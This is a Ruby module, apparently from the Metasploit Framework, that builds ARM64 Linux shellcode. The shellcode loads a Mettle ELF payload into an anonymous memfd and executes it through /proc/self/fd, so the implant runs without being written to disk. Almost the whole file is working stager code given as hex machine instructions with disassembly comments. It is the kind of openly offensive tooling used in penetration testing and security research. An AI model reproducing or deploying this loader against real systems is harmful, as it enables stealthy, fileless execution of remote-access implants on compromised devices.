#
# In memory loader used to execute Mettle ELF file.
# Compatible with Kernel Linux >= 3.17 (where memfd_create is introduced)
# Author: Martin Sutovsky <martin_sutovsky[at]rapid7.com>
# Resource and Credits: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
# ARM64 conventions
#  Parameters: x0-x7
#  Syscall offset: x8
#  Return Address for BL: x30
#
module Msf::Payload::Linux::Aarch64::ElfLoader
  def in_memory_load(payload)
    # the exec syscall can be substituted with execveat syscall, which takes out the need for itoa, however, it proved to be not stable across various IoT-specific kernel versions
    in_memory_loader = [
      # memfd_create(null, MFD_CLOEXEC);
      0x0a0080d2, # 0x1000:	mov	x10, #0	0x0a0080d2
      0xea0300f9, # 0x1004:	str	x10, [sp]	0xea0300f9
      0xe0030091, # 0x1008:	mov	x0, sp	0xe0030091
      0x210080d2, # 0x100c:	mov	x1, #1	0x210080d2
      0xe82280d2, # 0x1010:	mov	x8, #0x117	0xe82280d2
      0x010000d4, # 0x1014:	svc	#0	0x010000d4

      # use branching and branching with link to reliably get address of payload data
      0xe90300aa, # 0x1018:	mov	x9, x0	0xe90300aa
      0x1f000014, # 0x101c:	b	#0x1098	0x1f000014
      0xea031eaa, # 0x1020:	mov	x10, x30	0xea031eaa

      # write(fd,payload_addr, payload_size)
      0x420140b9, # 0x1024:	ldr	w2, [x10]	0x420140b9
      0x4a890091, # 0x1028:	add	x10, x10, #0x22	0x4a890091
      0xe1030aaa, # 0x102c:	mov	x1, x10	0xe1030aaa
      0x080880d2, # 0x1030:	mov	x8, #0x40	0x080880d2
      0x010000d4, # 0x1034:	svc	#0	0x010000d4

      # convert fd using itoa and append it to /proc/self/fd/
      0x4b0180d2, # 0x1038:	mov	x11, #0xa	0x4b0180d2
      0x4a0900d1, # 0x103c:	sub	x10, x10, #2	0x4a0900d1
      0x2c09cb9a, # 0x1040:	udiv	x12, x9, x11	0x2c09cb9a
      0x8d7d0b9b, # 0x1044:	mul	x13, x12, x11	0x8d7d0b9b
      0x2d010dcb, # 0x1048:	sub	x13, x9, x13	0x2d010dcb
      0xe9030caa, # 0x104c:	mov	x9, x12	0xe9030caa
      0xadc10091, # 0x1050:	add	x13, x13, #0x30	0xadc10091
      0x4d010039, # 0x1054:	strb	w13, [x10]	0x4d010039
      0x4a0500d1, # 0x1058:	sub	x10, x10, #1	0x4a0500d1
      0x3f0100f1, # 0x105c:	cmp	x9, #0	0x3f0100f1
      0x01ffff54, # 0x1060:	b.ne	#0x1040	0x01ffff54
      0xe90580d2, # 0x1064:	mov	x9, #0x2f	0xe90580d2
      0x4b014039, # 0x1068:	ldrb	w11, [x10]	0x4b014039
      0x7f0109eb, # 0x106c:	cmp	x11, x9	0x7f0109eb
      0x80000054, # 0x1070:	b.eq	#0x1080	0x80000054
      0x49010039, # 0x1074:	strb	w9, [x10]	0x49010039
      0x4a0500d1, # 0x1078:	sub	x10, x10, #1	0x4a0500d1
      0xfaffff17, # 0x107c:	b	#0x1064	0xfaffff17
      0x4a3500d1, # 0x1080:	sub	x10, x10, #0xd	0x4a3500d1
      # execve(/proc/self/fd/[fd],0,0)
      0xe0030aaa, # 0x1084:	mov	x0, x10	0xe0030aaa
      0x010080d2, # 0x1088:	mov	x1, #0	0x010080d2
      0x020080d2, # 0x108c:	mov	x2, #0	0x020080d2
      0xa81b80d2, # 0x1090:	mov	x8, #0xdd	0xa81b80d2
      0x010000d4, # 0x1094:	svc	#0	0x010000d4
      0xe2ffff97, # 0x1098:	bl	#0x1020	0xe2ffff97,
    ].pack('N*')
    fd_path = '/proc/self/fd/'.bytes.pack('c*') + "\x00" * 16
    in_memory_loader + [payload.length].pack('V*') + fd_path
  end
end
